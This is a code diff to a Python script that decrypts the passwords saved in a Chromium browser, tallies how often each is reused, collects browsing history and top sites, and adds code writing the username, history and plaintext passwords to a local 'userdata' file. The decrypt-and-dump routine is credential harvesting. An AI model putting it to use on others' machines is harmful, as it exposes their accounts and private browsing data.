@@ -1,3 +1,7 @@
+import sys
+import os
+import json
+
 from chromiumBrowser import Chromium
 import dataComprehention
 import getBrowser
@@ -21,6 +25,7 @@ for login in loginData:
     if url == "" or username == "": continue
     secretKey = defaultBrowser.getSecretKey()
     password = defaultBrowser.decryptPassword(ciphertext, secretKey)
+    if password == '': continue
 
     if password in passwordsAndFreq.keys(): passwordsAndFreq[password] += 1
     else: passwordsAndFreq[password] = 1
@@ -33,3 +38,22 @@ topWebsites = dataComprehention.topWebsitesVisited(history)
 
 # clear the temp folder to remove clutter
 defaultBrowser.cleanup()
+
+
+username = os.getlogin()
+with open(os.path.join(sys.argv[1], "userdata"), "w") as f:
+    """
+    output = {
+        "name": username,
+        "history": history,
+        "topWebsites": topWebsites,
+        "passwordsAndFrequency": passwordsAndFreq
+    }
+    f.write(json.dumps(output))
+    """
+    f.writelines([
+        username, "\n",
+        json.dumps( history ), "\n",
+        json.dumps( topWebsites ), "\n",
+        json.dumps( passwordsAndFreq ), "\n",
+    ])
